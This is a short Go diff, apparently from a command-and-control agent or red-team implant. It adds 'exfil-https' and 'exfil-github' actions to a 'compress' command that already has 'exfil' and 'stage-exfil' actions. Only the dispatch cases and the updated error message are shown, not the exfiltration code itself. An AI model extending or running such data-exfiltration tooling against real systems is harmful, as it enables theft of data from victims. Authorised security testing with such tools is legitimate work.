@@ -89,8 +89,12 @@ func (c *CompressCommand) Execute(task structs.Task) structs.CommandResult {
 		return compressExfil(task, params)
 	case "stage-exfil":
 		return compressStageExfil(task, params)
+	case "exfil-https":
+		return compressExfilHTTPS(task, params)
+	case "exfil-github":
+		return compressExfilGitHub(task, params)
 	default:
-		return errorf("Unknown action: %s (use 'create', 'list', 'extract', 'stage', 'exfil', or 'stage-exfil')", params.Action)
+		return errorf("Unknown action: %s (use 'create', 'list', 'extract', 'stage', 'exfil', 'stage-exfil', 'exfil-https', or 'exfil-github')", params.Action)
 	}
 }
 
